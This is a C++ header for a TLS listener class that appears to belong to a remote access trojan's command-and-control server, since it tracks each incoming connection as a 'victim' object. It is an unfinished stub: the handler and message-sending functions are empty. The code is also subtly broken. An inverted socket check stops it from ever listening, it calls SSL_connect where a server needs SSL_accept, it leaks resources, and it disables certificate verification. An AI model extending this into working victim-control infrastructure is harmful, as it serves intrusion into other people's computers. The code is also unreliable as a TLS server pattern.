#pragma once

#include <iostream>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <thread>
#include <vector>
#include <memory>
#include <algorithm>
#include <atomic>
#include <unordered_map>
#include <mutex>

//OpenSSL
#include <openssl/ssl.h>
#include <openssl/err.h>

//Module
#include "clsEDP.hpp"
#include "clsTools.hpp"
#include "clsVictim.hpp"
#include "clsDebugTools.hpp"

class clsLtnTls
{
private:
    int m_nSktSrv = -1;
    int m_nPort;

    SSL_CTX* m_sslCtx = nullptr;

    std::shared_ptr<clsVictim> m_vicParent = nullptr;
    std::vector<std::thread> m_threads;

    struct stHeartbeatCtx
    {
        std::atomic<bool> running { true };
        std::thread th;
    };

    bool m_bIsRunning = false;

public:
    clsLtnTls() = default;

    clsLtnTls(std::shared_ptr<clsVictim> victim, int nPort)
    {
        m_vicParent = victim;
        m_nPort = nPort;

        m_nSktSrv = socket(AF_INET, SOCK_STREAM, 0);
        m_bIsRunning = false;

        sockaddr_in srvAddr {};
        srvAddr.sin_family = AF_INET;
        srvAddr.sin_port = htons(nPort);
        srvAddr.sin_addr.s_addr = INADDR_ANY;

        int nOpt = 1;
        setsockopt(m_nSktSrv, SOL_SOCKET, SO_REUSEADDR, &nOpt, sizeof(nOpt));
        bind(m_nSktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr));
    }

    ~clsLtnTls()
    {
        fnStop();
    }

    void fnStart(std::vector<uint8_t>& abCert, std::vector<uint8_t>& abKey)
    {
        if (m_nSktSrv != -1 || m_bIsRunning)
            return;

        listen(m_nSktSrv, 1000);
        clsTools::fnLogInfo("Listening...");
        m_bIsRunning = true;

        while (m_bIsRunning)
        {
            sockaddr_in clntAddr {};
            socklen_t nLen = sizeof(clntAddr);

            int nSktClnt = accept(m_nSktSrv, (sockaddr *)&clntAddr, &nLen);
            if (nSktClnt < 0)
            {
                perror("accept");
                continue;
            }

            SSL_CTX* ctx = fnInitTlsFromMemory(abCert, abKey);

            SSL* ssl = SSL_new(ctx);
            SSL_set_fd(ssl, nSktClnt);
            if (SSL_connect(ssl) <= 0)
            {
                ERR_print_errors_fp(stderr);
                return;
            }

            auto victim = std::make_shared<clsVictim>(clsVictim::enMethod::TLS, nSktClnt, ssl);
            m_threads.emplace_back(&clsLtnTls::fnHandler, this, victim, ssl);
            m_threads.back().detach();
        }
    }

    void fnStop()
    {
        m_bIsRunning = false;
        close(m_nSktSrv);
        m_sslCtx = nullptr;
    }

    void fnSendToSub(std::string& szSubID, std::vector<std::string>& vuMsg)
    {
        
    }

private:
    void fnHandler(std::shared_ptr<clsVictim> victim, SSL* ssl)
    {
        try
        {
            clsTools::fnLogInfo("Accepted new client");

            int nRecv = 0;
            std::vector<unsigned char> vuStaticRecvBuf(clsEDP::MAX_SIZE);
            std::vector<unsigned char> vuDynamicRecvBuf;


        }
        catch(const std::exception& e)
        {
            std::cerr << e.what() << '\n';
        }
        
    }

    SSL_CTX* fnInitTlsFromMemory(std::vector<uint8_t>& abCert, std::vector<uint8_t>& abKey)
    {
        SSL_library_init();
        SSL_load_error_strings();
        OpenSSL_add_ssl_algorithms();

        SSL_CTX* ctx = SSL_CTX_new(TLS_server_method());
        if (!ctx)
        {

            return nullptr;    
        }

        BIO* certBio = BIO_new_mem_buf(abCert.data(), abCert.size());
        BIO* keyBio = BIO_new_mem_buf(abKey.data(), abKey.size());

        X509* cert = PEM_read_bio_X509(certBio, nullptr, nullptr, nullptr);
        EVP_PKEY* pKey = PEM_read_bio_PrivateKey(keyBio, nullptr, nullptr, nullptr);

        if (!cert || !pKey)
        {
            
            return nullptr;
        }

        SSL_CTX_use_certificate(ctx, cert);
        SSL_CTX_use_PrivateKey(ctx, pKey);

        if (!SSL_CTX_check_private_key(ctx))
        {

            return nullptr;
        }

        X509_free(cert);
        EVP_PKEY_free(pKey);
        BIO_free(certBio);
        BIO_free(keyBio);

        SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, nullptr);
        SSL_CTX_set_mode(ctx, SSL_MODE_AUTO_RETRY);

        return ctx;
    }
};